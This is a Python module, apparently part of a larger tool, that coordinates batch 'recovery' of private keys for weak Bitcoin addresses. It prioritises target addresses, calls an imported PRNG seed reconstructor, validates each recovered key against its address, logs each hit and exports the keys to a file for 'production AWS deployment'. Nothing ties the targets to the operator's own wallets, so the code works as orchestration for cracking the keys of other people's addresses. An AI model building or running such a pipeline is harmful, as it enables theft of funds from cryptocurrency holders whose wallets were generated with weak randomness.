"""
Key Recovery Module
===================

Coordinates the key recovery process for weak addresses.
Combines PRNG reconstruction with validation and logging.

Recovery Pipeline:
1. Prioritize targets based on weakness indicators
2. Attempt PRNG seed reconstruction
3. Validate recovered keys
4. Document successful recoveries
"""

import time
from typing import List, Dict, Optional, Tuple
import logging
from prng_reconstructor import PRNGReconstructor
from validator import Validator


class KeyRecovery:
    """
    Manages the key recovery process for weak Bitcoin addresses.
    
    Orchestrates PRNG reconstruction attempts with resource management
    and comprehensive logging for production AWS deployment.
    """
    
    def __init__(self, config: Dict, prng_reconstructor: PRNGReconstructor, validator: Validator):
        """
        Initialize the key recovery coordinator.
        
        Args:
            config: Configuration dictionary
            prng_reconstructor: PRNG reconstructor instance
            validator: Key validator instance
        """
        self.config = config
        self.prng = prng_reconstructor
        self.validator = validator
        
        self.max_attempts = config['key_recovery']['max_recovery_attempts']
        self.timeout_per_address = config['key_recovery']['timeout_per_address']
        
        self.logger = logging.getLogger(__name__)
        
        # Recovery statistics
        self.attempts = 0
        self.successes = 0
        self.failures = 0
        self.recovered_keys = []
    
    def recover_single_key(self, address: str, priority_score: float = 0.0) -> Optional[Dict]:
        """
        Attempt to recover the private key for a single address.
        
        Args:
            address: Bitcoin address to recover key for
            priority_score: Priority score from pattern detection
            
        Returns:
            Dictionary with recovery results, or None if failed
        """
        self.logger.info(f"Attempting key recovery for address: {address}")
        self.logger.info(f"Priority score: {priority_score:.2f}")
        
        self.attempts += 1
        start_time = time.time()
        
        try:
            # Attempt PRNG seed reconstruction
            result = self.prng.reconstruct_seed_parallel(address)
            
            if result is None:
                self.logger.warning(f"Key recovery failed for {address}: no seed found")
                self.failures += 1
                return None
            
            seed, private_key = result
            elapsed_time = time.time() - start_time
            
            # Validate the recovered key
            is_valid = self.validator.validate_key_address_match(private_key.hex(), address)
            
            if not is_valid:
                self.logger.error(f"Validation failed for recovered key (seed: {seed})")
                self.failures += 1
                return None
            
            # Success!
            self.successes += 1
            
            recovery_result = {
                'address': address,
                'seed': seed,
                'private_key': private_key.hex(),
                'priority_score': priority_score,
                'recovery_time_seconds': round(elapsed_time, 2),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'validated': True
            }
            
            self.recovered_keys.append(recovery_result)
            
            self.logger.info(f"KEY RECOVERED! Address: {address}, Seed: {seed}, Time: {elapsed_time:.2f}s")
            
            return recovery_result
        
        except Exception as e:
            self.logger.error(f"Exception during key recovery for {address}: {e}")
            self.failures += 1
            return None
    
    def recover_batch(self, targets: List[Dict]) -> List[Dict]:
        """
        Attempt to recover keys for a batch of target addresses.
        
        Args:
            targets: List of target dictionaries with addresses and scores
            
        Returns:
            List of successful recovery result dictionaries
        """
        self.logger.info(f"Starting batch key recovery for {len(targets)} targets")
        
        recoveries = []
        
        for i, target in enumerate(targets):
            # Check attempt limit
            if self.successes >= self.max_attempts:
                self.logger.info(f"Reached maximum recovery attempts ({self.max_attempts})")
                break
            
            address = target.get('address', '')
            priority_score = target.get('score', 0.0)
            
            self.logger.info(f"Recovery attempt {i+1}/{len(targets)}: {address}")
            
            # Attempt recovery
            result = self.recover_single_key(address, priority_score)
            
            if result:
                recoveries.append(result)
                self.logger.info(f"Batch progress: {len(recoveries)} recoveries, {self.failures} failures")
        
        self.logger.info(f"Batch recovery complete: {len(recoveries)} keys recovered")
        
        return recoveries
    
    def get_recovery_stats(self) -> Dict:
        """
        Get recovery attempt statistics.
        
        Returns:
            Statistics dictionary
        """
        success_rate = (self.successes / self.attempts * 100) if self.attempts > 0 else 0.0
        
        return {
            'total_attempts': self.attempts,
            'successful_recoveries': self.successes,
            'failed_attempts': self.failures,
            'success_rate_percent': round(success_rate, 2),
            'recovered_keys_count': len(self.recovered_keys)
        }
    
    def get_recovered_keys(self) -> List[Dict]:
        """
        Get list of all successfully recovered keys.
        
        Returns:
            List of recovery result dictionaries
        """
        return self.recovered_keys.copy()
    
    def export_recovered_keys(self, filepath: str):
        """
        Export recovered keys to a file.
        
        WARNING: Contains sensitive private key information!
        
        Args:
            filepath: Path to export file
        """
        import json
        
        export_data = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'statistics': self.get_recovery_stats(),
            'recovered_keys': self.recovered_keys
        }
        
        with open(filepath, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        self.logger.info(f"Recovered keys exported to {filepath}")
        self.logger.warning("SECURITY: Exported file contains private keys - handle securely!")
